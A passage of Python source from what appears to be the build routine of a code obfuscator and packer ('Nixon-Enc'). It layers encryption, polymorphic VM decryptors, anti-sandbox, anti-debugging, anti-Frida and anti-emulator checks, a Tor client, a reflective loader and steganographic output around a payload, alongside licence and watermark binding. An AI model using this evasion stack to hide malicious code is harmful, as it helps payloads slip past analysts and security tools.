            # loader must stay stdlib-only (cryptography is build-time-only).
            # Force the XOR-stream construction here so build output is always
            # loader-readable; AES-CTR stays available via encrypt_payload for
            # non-artifact uses (binding envelopes, dispersal).
            core_blob = lzma.compress(encrypt_payload(padded_raw, encryption_key, nonce, use_aes_ctr=False))
            mid_buf = io.BytesIO()
            with zipfile.ZipFile(mid_buf, 'w', zipfile.ZIP_DEFLATED) as z: z.writestr("payload", Nixon_Enc_onion(core_blob, recipe_in))
            outer_encoded = Nixon_Enc_onion(mid_buf.getvalue(), recipe_out)
            try: payload_str = outer_encoded.decode('utf-8')
            except Exception: payload_str = base64.b64encode(outer_encoded).decode('ascii'); recipe_out.append('b64')
            s0_key = _ent.bytes(32)
            stage0_safe = base64.b64encode(bytes([ord(c) ^ s0_key[i % len(s0_key)] for i, c in enumerate(payload_str)])).decode('ascii')
            chunks = [stage0_safe[i:i+1000] for i in range(0, len(stage0_safe), 1000)]
            from io import StringIO
            parts_buffer = StringIO()
            for i, c in enumerate(chunks): parts_buffer.write(f'{VARS["PART_PREFIX"]}{i} = "{c}"\n')
            parts_code = parts_buffer.getvalue()
            rng_seed = int(hashlib.sha256(watermark_seed).hexdigest(), 16) if watermark_seed else None
            map1 = generate_polymorphic_map(rng_seed)
            map2 = generate_polymorphic_map(rng_seed + 1 if rng_seed else None)
            map3 = generate_polymorphic_map(rng_seed + 2 if rng_seed else None)
            rng_ctx = random.Random(rng_seed + 3) if rng_seed else secrets
            vm_source = generate_poly_vm(VARS, rng_ctx)
            vm_seed1 = _ent.below(256)
            vm_seed2 = _ent.below(256)
            bc1 = compile_vm_stage1_decryptor(map1, vm_seed1, rng_seed)
            vm1_key = hashlib.sha256(str(vm_seed1).encode()).digest()
            bc2 = compile_vm_stage1_decryptor(map2, vm_seed2, rng_seed)
            vm2_key = hashlib.sha256(str(vm_seed2).encode()).digest()
            bc2_enc = bytearray(bc2)
            for i in range(len(bc2_enc)): bc2_enc[i] ^= vm1_key[i % len(vm1_key)]
            bc3 = bytearray(compile_vm_stage2_Nixon_Enc(map3, rng_seed))
            bc3_enc = bytearray(bc3)
            for i in range(len(bc3_enc)): bc3_enc[i] ^= vm2_key[i % len(vm2_key)]
            p_hash = hashlib.sha256(payload_str.encode()).digest()
            part_a = _ent.bytes(32)
            part_b = bytes([a^b^c for a,b,c in zip(part_a, p_hash, key)])
            dummy_checksum = "0" * 64
            hmac_secret = _ent.hex(32)
            hmac_key_hex = getattr(args, '_cf_hmac_key', None) or _ent.hex(32)
            decoy_code = generate_decoy_code(); dead_code = generate_dead_code_paths()
            magic_str = VARS["MAGIC"].decode('latin1'); build_id = _ent.hex(16)
            canary_final = CANARY_SOURCE.replace(get_random_var_name("CANARY"), var_func_canary)
            # Batch-B #27: audit-hook plant snippet (default ON unless
            # NIXON_AUDITHOOK_PLANT_OFF truthy; --no-audit-hook-plant opts
            # out at build time). Best-effort: never fails the build.
            try:
                from obfuscator.audit_hook import emit_snippet as _ah_emit
                _audit_hook_opt_out = bool(getattr(args, 'audit_hook_plant_off', False))
                _audit_hook_source_val = "" if _audit_hook_opt_out else _ah_emit()
            except Exception:
                _audit_hook_source_val = ""
            def _audit_hook_source():
                return _audit_hook_source_val
            var_nano_main = get_random_var_name("NANO_MAIN")
            var_nano_marker = get_random_var_name("NANO_MARKER")
            var_hw_bp = get_random_var_name("HW_BP")
            var_tor_cls = get_random_var_name("TOR_CLIENT")
            get_random_var_name('TOR_INST')
            VARS["FUNC_NANOMITE_MAIN"] = var_nano_main
            VARS["VAR_NANO_MARKER"] = var_nano_marker
            VARS["METHOD_CHECK_HW_BPS"] = var_hw_bp
            VARS["TOR_CLIENT_CLS"] = var_tor_cls
            VARS["VAR_TOR_CLIENT_CLS"] = var_tor_cls
            session_token_bytes = _ent.bytes(32)
            # The plaintext-dump debug aid.  It used to be a RUNTIME env
            # switch (NIXON_DUMP_RAW=1), which meant every release
            # artifact carried the ability to write its own decrypted
            # source to disk.  It is now a build-time opt-in: the code is
            # simply not compiled into a normal artifact.
            _raw_dump_block = "pass"
            if getattr(args, "debug_dump_raw", False):
                _raw_dump_block = (
                    "if _nixon_オペレーション運営.environ.get("
                    '"NIXON_DUMP_RAW", "0") == "1":\n'
                    "    _nx_dfd, _nx_dpath = "
                    "_nixon_テンプ임시.mkstemp("
                    'prefix="nixon_raw_", suffix=".py")\n'
                    "    try:\n"
                    "        _nixon_オペレーション運営.write("
                    "_nx_dfd, raw if isinstance(raw, bytes) "
                    'else raw.encode("utf-8"))\n'
                    "    finally:\n"
                    "        _nixon_オペレーション運営.close(_nx_dfd)")
            build_context = {
                'NTRU_PUB_KEY': getattr(args, '_ntru_pub', '[]'),
                'SESSION_TOKEN': session_token_bytes.hex(),
                'hmac_key_hex': hmac_key_hex,
                'VAR_STR_TABLE': VARS["STR_TABLE"],
                'VAR_ENC_BLOB': VARS.get("ENC_BLOB", "_nx_eblob"),
                'VAR_EK_A': VARS.get("EK_A", "_nx_eka"),
                'VAR_EK_B': VARS.get("EK_B", "_nx_ekb"),
                'FUNC_TBL_INIT': VARS.get("FUNC_TBL_INIT", "_nx_tinit"),
                'FUNC_EXTRACT_WIPE': VARS.get("FUNC_EXTRACT_WIPE", "_nx_exwp"),
                'VAR_CHECKSUM': VARS["CHECKSUM"],
                'dummy_checksum': dummy_checksum,
                'VAR_HMAC_SIG': VARS["HMAC_SIG"],
                'nanomite_source': NANOMITE_SOURCE,
                'FUNC_NANOMITE_MAIN': var_nano_main,
                'VAR_NANO_MARKER': var_nano_marker,
                'METHOD_CHECK_HW_BPS': var_hw_bp,
                'dummy_hmac': dummy_checksum,
                'FUNC_STR_DEC': VARS["FUNC_STR_DEC"],
                'STR_KEY': VARS["STR_KEY"],
                'STR_SESSION_KEY': STRING_SESSION_KEY,
                'build_timestamp': build_timestamp,
                'build_id': build_id,
                'customer_salt': _customer_salt,
                'licence_bound': '1' if _licence_bound else '0',
                'required_python_version': f"({args.python.split('.')[0]}, {args.python.split('.')[1]})" if getattr(args, 'python', None) and '.' in args.python else f"({sys.version_info[0]}, {sys.version_info[1]})",
                'VAR_PAYLOAD': VARS["PAYLOAD"],
                'VAR_NONCE': VARS["NONCE"],
                'nonce': nonce,
                'VAR_PART_A': VARS["PART_A"],
                'key_part_a': part_a,
                'VAR_PART_B': VARS["PART_B"],
                'key_part_b': part_b,
                'VAR_S0_A': VARS["S0_A"],
                's0_a': s0_key[:16],
                'VAR_S0_B': VARS["S0_B"],
                's0_b': s0_key[16:],
                'VAR_RECIPE_IN': VARS["RECIPE_IN"],
                'recipe_in_Nixon_Enc': pack_recipe(recipe_in),
                'VAR_RECIPE_OUT': VARS["RECIPE_OUT"],
                'recipe_out_Nixon_Enc': pack_recipe(recipe_out),
                'VAR_HW_LOCK': VARS["HW_LOCK"],
                'hw_lock_bool': str(hw_enable),
                'VAR_EXP_DATE': VARS["EXP_DATE"],
                'exp_timestamp': exp_ts,
                'swizzle_key': bytes(swizzle_key),
                'payload_parts_code': parts_code,
                'cipher_source': CIPHER_SOURCE,
                # The importer source carries the plaintext-dump debug
                # aid behind a {RAW_DUMP_BLOCK} placeholder.  It is
                # substituted HERE, not by the outer .format(): the
                # importer source is a build_context VALUE, and a
                # one-pass .format() does not re-scan substituted text.
                'importer_source': IMPORTER_SOURCE.replace(
                    "{RAW_DUMP_BLOCK}", _raw_dump_block),
                'anti_sandbox_source': ANTI_SANDBOX_SOURCE,
                'VAR_ANTI_SANDBOX_CLS': VARS["ANTI_SANDBOX_CLS"],
                'vm_source': vm_source,
                'secure_mem_source': SECURE_MEM_SOURCE,
                'integrity_check_source': INTEGRITY_CHECK_SOURCE,
                'timing_sidechain_source': TIMING_SIDECHAIN_SOURCE,
                'bytecode_patcher_source': BYTECODE_PATCHER_SOURCE,
                'VAR_TIMING_SIDECHAIN_CLS': VARS["TIMING_SIDECHAIN_CLS"],
                'VAR_BYTECODE_PATCHER_CLS': VARS["BYTECODE_PATCHER_CLS"],
                'chimeric_jit_source': CHIMERIC_JIT_SOURCE,
                'ghost_func_source': GHOST_FUNC_SOURCE,
                'self_morph_graph_source': SELF_MORPH_GRAPH_SOURCE,
                'honey_decoy_source': HONEY_DECOY_SOURCE,
                'multidim_encode_source': MULTIDIM_ENCODE_SOURCE,
                'VAR_CHIMERIC_JIT_CLS': VARS["CHIMERIC_JIT_CLS"],
                'VAR_GHOST_FUNC_CLS': VARS["GHOST_FUNC_CLS"],
                'VAR_SELF_MORPH_CLS': VARS["SELF_MORPH_CLS"],
                'VAR_MULTIDIM_CLS': VARS["MULTIDIM_CLS"],
                'isr_encoder_source': ISR_ENCODER_SOURCE,
                'stack_cfi_source': STACK_CFI_SOURCE,
                'exec_trace_source': EXEC_TRACE_SOURCE,
                'smart_decoy_source': SMART_DECOY_SOURCE,
                'mem_randomizer_source': MEM_RANDOMIZER_SOURCE,
                'poly_const_source': POLY_CONST_SOURCE,
                'timing_key_source': TIMING_KEY_SOURCE,
                'VAR_ISR_ENCODER_CLS': VARS["ISR_ENCODER_CLS"],
                'VAR_STACK_CFI_CLS': VARS["STACK_CFI_CLS"],
                'VAR_MEM_RANDOMIZER_CLS': VARS["MEM_RANDOMIZER_CLS"],
                'VAR_POLY_CONST_CLS': VARS["POLY_CONST_CLS"],
                'VAR_TIMING_KEY_CLS': VARS["TIMING_KEY_CLS"],
                'non_determ_source': NON_DETERM_SOURCE,
                'proactive_corrupt_source': PROACTIVE_CORRUPT_SOURCE,
                'quine_check_source': QUINE_CHECK_SOURCE,
                'metamorphic_source': METAMORPHIC_SOURCE,
                'quantum_entangle_source': QUANTUM_ENTANGLE_SOURCE,
                'temporal_logic_source': TEMPORAL_LOGIC_SOURCE,
                'commitment_source': COMMITMENT_SOURCE,
                'VAR_NON_DETERM_CLS': VARS["NON_DETERM_CLS"],
                'VAR_PROACTIVE_CORRUPT_CLS': VARS["PROACTIVE_CORRUPT_CLS"],
                'VAR_QUINE_CHECK_CLS': VARS["QUINE_CHECK_CLS"],
                'VAR_METAMORPHIC_CLS': VARS["METAMORPHIC_CLS"],
                'VAR_QUANTUM_ENTANGLE_CLS': VARS["QUANTUM_ENTANGLE_CLS"],
                'VAR_TEMPORAL_LOGIC_CLS': VARS["TEMPORAL_LOGIC_CLS"],
                'VAR_COMMITMENT_CLS': VARS["COMMITMENT_CLS"],
                'gordian_knot_source': GORDIAN_KNOT_SOURCE,
                'custom_vm_source': CUSTOM_VM_SOURCE,
                'whitebox_crypto_source': WHITEBOX_CRYPTO_SOURCE,
                'shapeshifter_source': SHAPESHIFTER_SOURCE,
                'nanomite_guard_source': NANOMITE_GUARD_SOURCE,
                'VAR_GORDIAN_KNOT_CLS': VARS["GORDIAN_KNOT_CLS"],
                'VAR_CUSTOM_VM_CLS': VARS["CUSTOM_VM_CLS"],
                'VAR_WHITEBOX_CRYPTO_CLS': VARS["WHITEBOX_CRYPTO_CLS"],
                'VAR_SHAPESHIFTER_CLS': VARS["SHAPESHIFTER_CLS"],
                'VAR_NANOMITE_GUARD_CLS': VARS["NANOMITE_GUARD_CLS"],
                'logic_entangle_source': LOGIC_ENTANGLE_SOURCE,
                'rolling_isa_source': ROLLING_ISA_SOURCE,
                'whitebox_enhanced_source': WHITEBOX_ENHANCED_SOURCE,
                'temporal_degrade_source': TEMPORAL_DEGRADE_SOURCE,
                'code_bloat_source': CODE_BLOAT_SOURCE,
                'cross_platform_guard_source': CROSS_PLATFORM_GUARD_SOURCE,
                'attrition_warfare_source': ATTRITION_WARFARE_SOURCE,
                'VAR_CROSS_PLATFORM_GUARD_CLS': VARS["CROSS_PLATFORM_GUARD_CLS"],
                'VAR_ATTRITION_CLS': VARS["ATTRITION_CLS"],
                'VAR_LOGIC_ENTANGLE_CLS': VARS["LOGIC_ENTANGLE_CLS"],
                'VAR_ROLLING_ISA_CLS': VARS["ROLLING_ISA_CLS"],
                'VAR_WHITEBOX_ENHANCED_CLS': VARS["WHITEBOX_ENHANCED_CLS"],
                'VAR_TEMPORAL_DEGRADE_CLS': VARS["TEMPORAL_DEGRADE_CLS"],
                'VAR_CODE_BLOAT_CLS': VARS["CODE_BLOAT_CLS"],
                'decoy_code': decoy_code,
                'dead_code': dead_code,
                'VAR_NET_URL': VARS["NET_URL"],
                'net_url_Nixon_Enc': net_url_Nixon_Enc,
                'VAR_NATIVE_BLOB': VARS["NATIVE_BLOB"],
                'native_blobs_json': repr(native_blobs),
                'VAR_TOTAL_PARTS': VARS["TOTAL_PARTS"],
                'total_parts': len(chunks),
                'vm_op_map_1': map1,
                'vm_op_map_2': map2,
                'vm_op_map_3': map3,
                'vm_bc_3_Nixon_Enc': bytes(bc3_enc),
                'vm_bc_2_Enc': bytes(bc2_enc),
                'vm_bc_1': bytes(bc1),
                'vm_seed_val': vm_seed1,
                'VAR_IS_DEBUG': VARS["IS_DEBUG"],
                # The environment detections are signals by default; with
                # --strict-detections they become gates.
                'VAR_STRICT_DETECTIONS': bool(
                    getattr(args, 'strict_detections', False)),
                'is_debug_val': str(is_debug),
                'EXC_STATE': VARS["EXC_STATE"],
                'FUNC_WIPE': VARS["FUNC_WIPE"],
                'FUNC_SELF': VARS["FUNC_SELF"],
                'FUNC_PARENT': VARS["FUNC_PARENT"],
                'FUNC_MEM': VARS["FUNC_MEM"],
                'FUNC_VM': VARS["FUNC_VM"],
                'FUNC_HOOK': VARS["FUNC_HOOK"],
                'FUNC_RES': VARS["FUNC_RES"],
                'FUNC_CHECK': VARS["FUNC_CHECK"],
                'FUNC_ROT': VARS["FUNC_ROT"],
                'FUNC_DEC_REC': VARS["FUNC_DEC_REC"],
                'FUNC_REV': VARS["FUNC_REV"],
                'FUNC_JOIN': VARS["FUNC_JOIN"],
                'FUNC_STAGE0': VARS["FUNC_STAGE0"],
                'FUNC_KEY': VARS["FUNC_KEY"],
                'FUNC_BOOT': VARS["FUNC_BOOT"],
                'VAR_CIPHER_CLS': VARS["CIPHER_CLS"],
                'MAGIC_STR': magic_str,
                'VAR_LOADER_CLS': VARS["LOADER_CLS"],
                'FUNC_NET': VARS["FUNC_NET"],
                'VAR_VM_CLS': VARS["VM_CLS"],
                'VAR_FUNC_SEC_MEM': VARS["FUNC_SEC_MEM"],
                'VAR_FUNC_ADV_HK': VARS["FUNC_ADV_HK"],
                'HMAC_SECRET_HEX': hmac_secret,
                'INNER_KEY_HEX': inner_key_hex,
                'VAR_PAYLOAD_MAC': payload_mac,
                'NATIVE_BLOB_KEY_HEX': _key_raw.hex(),
                'DECOY_FUNC': VARS['DECOY_FUNC'],
                'remove_entropy_code': remove_entropy_source(VARS["ENTROPY_MARKER"]),
                'VAR_ONE_SHOT': var_oneshot,
                'one_shot_bool': str(one_shot),
                'name1': VARS.get('DECOY_FUNCS', ['d1'])[0],
                'name2': VARS.get('DECOY_FUNCS', ['d1', 'd2'])[1],
                'name3': VARS.get('DECOY_FUNCS', ['d1', 'd2', 'd3'])[2],
                'VAR_ENTROPY_MARKER': VARS["ENTROPY_MARKER"],
                'entropy_marker_val': repr(entropy_marker),
                'FUNC_LOG': VARS["FUNC_LOG"],
                'NEXT_H_SOURCE': NEXT_H_SOURCE,
                'morph_map_a': repr(map_a),
                'morph_map_b': repr(map_b),
                'FUNC_HW_BIND': VARS["FUNC_HW_BIND"],
                'VAR_FUNC_HARD': VARS["FUNC_HARD"],
                'hardening_source': HARDENING_SOURCE,
                'VAR_CLS_HARD': VARS["CLS_HARD"],
                'FUNC_PHASE1': VARS["FUNC_PHASE1"],
                'FUNC_PHASE2': VARS["FUNC_PHASE2"],
                'FUNC_DECOY_PROC': VARS["FUNC_DECOY_PROC"],
                'FUNC_LIVE_CHK': VARS["FUNC_LIVE_CHK"],
                'FUNC_HEAP_WALK': VARS["FUNC_HEAP_WALK"],
                'VAR_CLS_DECOY_VM': VARS["CLS_DECOY_VM"],
                'decoy_vm_source': DECOY_VM_SOURCE,
                'native_loader_source': NATIVE_LOADER_SOURCE,
                'hook_source': HOOK_SOURCE,
                'i_salt': i_salt,
                'i_salt_val': int.from_bytes(i_salt[:4], 'little'),
                'FUNC_DERIVE_INTEGRITY': VARS["FUNC_DERIVE_INTEGRITY"],
                'FUNC_DERIVE_ENV': VARS["FUNC_DERIVE_ENV"],
                'FUNC_UNLOCK_VM': VARS["FUNC_UNLOCK_VM"],
                'mask_source': MASK_SOURCE,
                'FUNC_MASK': VARS["FUNC_MASK"],
                'anti_frida_source': ANTI_FRIDA_SOURCE,
                'FUNC_FRIDA': VARS["FUNC_FRIDA"],
                'canary_source': canary_final,
                'VAR_CANARY_URL': var_canary_url,
                'canary_url_enc': canary_url_enc,
                'audit_hook_source': _audit_hook_source(),
                'VAR_FUNC_CANARY': var_func_canary,
                'antman_source': ANTMAN_SOURCE,
                'FUNC_ANTMAN': VARS["FUNC_ANTMAN"],
                'rdtsc_source': RDTSC_SOURCE,
                'FUNC_RDTSC': VARS["FUNC_RDTSC"],
                'doh_source': DOH_SOURCE,
                'FUNC_DOH': VARS["FUNC_DOH"],
                'tls_ca_source': TLS_CTX_SOURCE,
                'tls_ca_b64': tls_ca_b64,
                'api_hash_source': API_HASH_SOURCE,
                'FUNC_API_HASH': VARS["FUNC_API_HASH"],
                'stack_str_source': STACK_STR_SOURCE,
                'force_native': str(VARS.get("FORCE_NATIVE_EXEC", False)),
                'fake_crypto_source': FAKE_CRYPTO_LAYER_SOURCE,
                'merkle_tree_source': MERKLE_TREE_SOURCE,
                'reflective_loader_source': WINDOWS_REFLECTIVE_LOADER_SOURCE,
                'gc_manipulation_source': GC_MANIPULATION_SOURCE,
                'whitebox_cipher_source': WHITEBOX_CIPHER_SOURCE,
                'io_encoding_source': IO_ENCODING_SOURCE,
                'dual_cipher_source': DUAL_CIPHER_SOURCE,
                'VAR_WHITEBOX_CLS': VARS["WHITEBOX_CLS"],
                'VAR_IO_ENCODER_CLS': VARS["IO_ENCODER_CLS"],
                'VAR_DUAL_CIPHER_CLS': VARS["DUAL_CIPHER_CLS"],
                'opaque_const_source': OPAQUE_CONST_SOURCE,
                'decoy_decrypt_source': DECOY_DECRYPT_SOURCE,
                'execution_trace_source': EXECUTION_TRACE_SOURCE,
                'VAR_OPAQUE_CONST_CLS': VARS["OPAQUE_CONST_CLS"],
                'VAR_DECOY_DECRYPT_CLS': VARS["DECOY_DECRYPT_CLS"],
                'VAR_EXEC_TRACE_CLS': VARS["EXEC_TRACE_CLS"],
                'dynamic_morph_source': DYNAMIC_MORPH_SOURCE,
                'frame_anti_debug_source': FRAME_ANTI_DEBUG_SOURCE,
                'gc_anti_dump_source': GC_ANTI_DUMP_SOURCE,
                'jit_ast_source': JIT_AST_SOURCE,
                'bytecode_paging_source': BYTECODE_PAGING_SOURCE,
                'VAR_DYNAMIC_MORPH_CLS': VARS["DYNAMIC_MORPH_CLS"],
                'VAR_FRAME_ANTI_DEBUG_CLS': VARS["FRAME_ANTI_DEBUG_CLS"],
                'VAR_GC_ANTI_DUMP_CLS': VARS["GC_ANTI_DUMP_CLS"],
                'VAR_JIT_AST_CLS': VARS["JIT_AST_CLS"],
                'VAR_BYTECODE_PAGING_CLS': VARS["BYTECODE_PAGING_CLS"],
                'anti_decompiler_source': ANTI_DECOMPILER_SOURCE,
                'progressive_decrypt_source': PROGRESSIVE_DECRYPT_SOURCE,
                'VAR_ANTI_DECOMPILER_CLS': VARS["ANTI_DECOMPILER_CLS"],
                'VAR_PROGRESSIVE_DECRYPT_CLS': VARS["PROGRESSIVE_DECRYPT_CLS"],
                'watermark_source': WATERMARK_SOURCE,
                'traitor_trace_source': TRAITOR_TRACE_SOURCE,
                'VAR_WATERMARK_CLS': VARS["WATERMARK_CLS"],
                'VAR_TRAITOR_TRACE_CLS': VARS["TRAITOR_TRACE_CLS"],
                'enhanced_env_keying_source': ENHANCED_ENV_KEYING_SOURCE,
                'quantum_crypto_source': QUANTUM_CRYPTO_SOURCE,
                'secure_enclave_source': SECURE_ENCLAVE_SOURCE,
                'integrity_monitor_source': INTEGRITY_MONITOR_SOURCE,
                'anti_emulator_source': ANTI_EMULATOR_SOURCE,
                'VAR_ENV_KEYING_CLS': VARS["ENV_KEYING_CLS"],
                'VAR_QUANTUM_CRYPTO_CLS': VARS["QUANTUM_CRYPTO_CLS"],
                'VAR_SECURE_ENCLAVE_CLS': VARS["SECURE_ENCLAVE_CLS"],
                'VAR_INTEGRITY_MON_CLS': VARS["INTEGRITY_MON_CLS"],
                'VAR_ANTI_EMULATOR_CLS': VARS["ANTI_EMULATOR_CLS"],
                'code_signing_source': CODE_SIGNING_SOURCE,
                'tor_client_source': TOR_CLIENT_SOURCE,
                'nn_obfuscation_source': NN_OBFUSCATION_SOURCE,
                'blockchain_license_source': BLOCKCHAIN_LICENSE_SOURCE if ast_options.get('blockchain_rpc') else '',
                'runtime_mutation_source': RUNTIME_MUTATION_SOURCE,
                'geofence_source': GEOFENCE_SOURCE if (ast_options.get('allowed_countries') or ast_options.get('blocked_countries')) else '',
                'hw_perf_fingerprint_source': HW_PERF_FINGERPRINT_SOURCE,
                'key_shard_source': KEY_SHARD_SOURCE if ast_options.get('key_shard_urls') else '',
                'VAR_CODE_SIGN_CLS': VARS["CODE_SIGN_CLS"],
                'VAR_NN_OBF_CLS': VARS["NN_OBF_CLS"],
                'VAR_BLOCKCHAIN_LIC_CLS': VARS["BLOCKCHAIN_LIC_CLS"],
                'VAR_RUNTIME_MUTATE_CLS': VARS["RUNTIME_MUTATE_CLS"],
                'VAR_GEOFENCE_CLS': VARS["GEOFENCE_CLS"],
                'VAR_HW_PERF_CLS': VARS["HW_PERF_CLS"],
                'VAR_KEY_SHARD_CLS': VARS["KEY_SHARD_CLS"],
                'blockchain_contract': ast_options.get('blockchain_contract', ''),
                'blockchain_rpc': ast_options.get('blockchain_rpc', ''),
                'key_shard_urls': repr(ast_options.get('key_shard_urls', [])),
                'allowed_countries': repr(ast_options.get('allowed_countries', [])),
                'blocked_countries': repr(ast_options.get('blocked_countries', [])),
                'allowed_regions': repr(ast_options.get('allowed_regions', [])),
                'blocked_regions': repr(ast_options.get('blocked_regions', [])),
                'ATTR_MAP': secure_map_str,
                'fhe_source': FHE_SOURCE,
                'oram_source': ORAM_SOURCE,
                'semantic_synth_source': SEMANTIC_SYNTH_SOURCE,
                'triple_redundancy_source': TRIPLE_REDUNDANCY_SOURCE,
                'VAR_FHE_CLS': VARS["FHE_CLS"],
                'VAR_ORAM_CLS': VARS["ORAM_CLS"],
                'VAR_SYNTH_CLS': VARS["SYNTH_CLS"],
                'VAR_FAULT_CLS': VARS["FAULT_CLS"],
                'runtime_check_code': ast_options.get('runtime_check_code', 'pass')
            }
            # NOTE: do NOT write the outer payload key into
            # VARS["INNER_KEY_HEX"] here — build_context already holds
            # the inner __main__.nixon zip key under that name, and the
            # native-blob XOR key travels separately as
            # NATIVE_BLOB_KEY_HEX. Overwriting would make native-exec
            # decrypt with the wrong key.
            build_context.update(VARS)
            for k, v in build_context.items():
                if k.endswith('_source') or k.endswith('_code'):
                    build_context[k] = apply_vars(v).replace('{{', '{').replace('}}', '}')
            raw_script = (LOADER_HEAD + "\n" + LOADER_BODY).format(**build_context)
            # Key binding (--customer-salt / --licence-token) on THIS path.
            # The artefact carries the raw key; the mask is re-applied here
            # at run time.  In licence mode the material is not in the
            # artefact at all, so a missing token must fail loudly rather
            # than decrypt to garbage.
            if _key_raw is not None and (_customer_salt or _licence_bound):
                _anchor = 'BLOB_KEY = bytes.fromhex("%s")' % _key_raw.hex()
                if _anchor not in raw_script:
                    raise SystemExit(
                        "key binding: the emitted loader has no BLOB_KEY literal")
                _mode = "licence" if _licence_bound else "salt"
                raw_script = raw_script.replace(
                    _anchor, _anchor + "\n" + _key_binding_source(_mode, _customer_salt))
            # Hardening A2.2/A2.3: strip the fixed runtime vocabulary
            # (_nx_kill, _NX_AUDIT_*) out of the artifact.  The rename runs
            # on the assembled source -- after every emitter contributed its
            # snippet, before the string pass turns literals into table
            # lookups -- so a gate and the function it calls can never end up
            # with different spellings.  Both assertions are fail-loud: a
            # partially renamed loader raises NameError at run time instead
            # of exiting 137, which is worse than a failed build.
            from obfuscator.marker_names import (
                rename_markers as _rename_markers,
                assert_kill_wired as _assert_kill_wired,
                assert_markers_renamed as _assert_markers_renamed,
            )
            _marker_token = VARS["MARKER_TOKEN"]
            raw_script = _rename_markers(raw_script, _marker_token)
            _assert_kill_wired(raw_script, _marker_token)
            _assert_markers_renamed(raw_script, _marker_token)
            # Debug dump of the FULL PRE-ENCRYPTION loader (plaintext key
            # material): only when explicitly requested via NIXON_DUMP_RAW=1,
            # written via a secure temp file (O_EXCL 0600, random name) —
            # never a predictable world-readable /tmp path.
            if os.environ.get("NIXON_DUMP_RAW", "0") == "1":
                try:
                    import secrets as _dump_secrets
                    _dump_path = os.path.join(
                        tempfile.gettempdir(),
                        "_nx_raw_%s.py" % (_dump_secrets.token_hex(8),))
                    _dump_fd = os.open(_dump_path,
                                       os.O_WRONLY | os.O_CREAT | os.O_EXCL,
                                       0o600)
                    try:
                        os.write(_dump_fd, raw_script.encode("utf-8"))
                    finally:
                        os.close(_dump_fd)
                    print(f"    [DBG] Wrote raw_script to {_dump_path}",
                          flush=True)
                except Exception as _dump_err:
                    print(f"    [DBG] raw dump skipped: {_dump_err}",
                          flush=True)
            print("    [+] Applying Nixon-Enc...")
            Nixon_Enc_script = Nixon_Enc_strings(raw_script)
            Nixon_Enc_script = blind_constants(Nixon_Enc_script)
            if hasattr(args, '_real_native_blobs') and args._real_native_blobs:
                print("    [+] Injecting Native Binary Blobs (Final Step)...")
                Nixon_Enc_script = Nixon_Enc_script.replace('"__NATIVE_BLOBS_PLACEHOLDER__"', repr(args._real_native_blobs))
                Nixon_Enc_script = Nixon_Enc_script.replace("'__NATIVE_BLOBS_PLACEHOLDER__'", repr(args._real_native_blobs))
            if hasattr(args, '_real_fallback_blob') and args._real_fallback_blob:
                print("    [+] Injecting Fallback Blob...")
                Nixon_Enc_script = Nixon_Enc_script.replace('__FALLBACK_BLOB_PLACEHOLDER__', args._real_fallback_blob)
            is_valid, validation_issues = validate_obfuscated_code(Nixon_Enc_script)
            if not is_valid:
                print("    [!] Validation Issues Detected:")
                for issue in validation_issues:
                    print(f"        - {issue}")
                print("    [*] Attempting auto-fix...")
                try:
                    fixed_tree = ast.parse(Nixon_Enc_script)
                    ast.fix_missing_locations(fixed_tree)
                    fixed_code = ast.unparse(fixed_tree)
                    compile(fixed_code, '<autofix>', 'exec')
                    Nixon_Enc_script = fixed_code
                    print("    [+] Auto-fix successful (AST round-trip)")
                except Exception as fix_err:
                    print(f"    [!] Auto-fix failed: {fix_err}")
            enc_blob, enc_key_a, enc_key_b = get_Nixon_Enc_table()
            final_script = Nixon_Enc_script
            # Quote-robust: an AST round-trip (auto-fix above) normalizes
            # quotes to single, so replace both variants.
            for _q in ('"', "'"):
                final_script = final_script.replace(_q + "__NX_STR_TABLE_SENTINEL__" + _q, repr(enc_blob), 1)
                final_script = final_script.replace(_q + "__NX_STR_KEY_A__" + _q, repr(enc_key_a), 1)
                final_script = final_script.replace(_q + "__NX_STR_KEY_B__" + _q, repr(enc_key_b), 1)
            normalized_script = final_script.replace('\r\n', '\n')
            anchor_sig = b"__SIG_ANCHOR__"; anchor_hmac = b"__HMAC_ANCHOR__"
            script_bytes = normalized_script.encode('utf-8')
            lines_for_hash = []
            for line in script_bytes.splitlines(keepends=True):
                if anchor_sig not in line and anchor_hmac not in line:
                    lines_for_hash.append(line)
            verification_content = b"".join(lines_for_hash)
            hmac_val = hmac.new(bytes.fromhex(hmac_secret), verification_content, hashlib.sha256).hexdigest()
            mc_size = 1024
            m_chunks = [verification_content[i:i+mc_size] for i in range(0, len(verification_content), mc_size)]
            def build_merkle_sim(blocks):
                if not blocks: return ""
                hashes = [hashlib.sha256(b).hexdigest() for b in blocks]
                while len(hashes) > 1:
                    if len(hashes) % 2 == 1: hashes.append(hashes[-1])
                    parents = []
                    for i in range(0, len(hashes), 2):
                        combined = (hashes[i] + hashes[i+1]).encode()
                        parents.append(hashlib.sha256(combined).hexdigest())
                    hashes = parents
                return hashes[0]
            final_hash = build_merkle_sim(m_chunks)
            # Anchored checksum fill: replace the `= "000...0"` slot
            # assignments (CHECKSUM line first, HMAC line second) rather
            # than the first bare 64-zero run anywhere, which could sit
            # inside payload data. Falls back to the legacy replace when
            # the anchored pattern is absent.
            _ck_pat = re.compile(rb'=\s*["\']0{64}["\']')
            final_bytes, _n1 = _ck_pat.subn(b'= "' + final_hash.encode('utf-8') + b'"', script_bytes, count=1)
            if _n1 == 0:
                final_bytes = script_bytes.replace(dummy_checksum.encode('utf-8'), final_hash.encode('utf-8'), 1)
            final_bytes, _n2 = _ck_pat.subn(b'= "' + hmac_val.encode('utf-8') + b'"', final_bytes, count=1)
            if _n2 == 0:
                final_bytes = final_bytes.replace(dummy_checksum.encode('utf-8'), hmac_val.encode('utf-8'), 1)
            # The runtime identifies the excluded lines by the VALUES
            # (not by a marker string), so the two filters must select
            # the same lines.  If they do not -- e.g. the checksum hex
            # occurs somewhere else in the file -- the runtime would
            # hash a different content than the build did, and EVERY
            # run of the artifact would die.  Fail the build instead.
            _rt_keep = [l for l in final_bytes.splitlines(keepends=True)
                        if final_hash.encode('utf-8') not in l
                        and hmac_val.encode('utf-8') not in l]
            if b"".join(_rt_keep) != verification_content:
                raise RuntimeError(
                    "self-check filter mismatch: the runtime would hash "
                    "%d lines, the build hashed %d"
                    % (len(_rt_keep), len(lines_for_hash)))
            with open(out_name, 'wb') as f: 
                f.write(final_bytes)
            if ast_options.get('stego'):
                stego_out = out_name.replace('.py', '_stego.py')
                stego_wrap_output(final_bytes.decode('utf-8', errors='ignore'), stego_out)
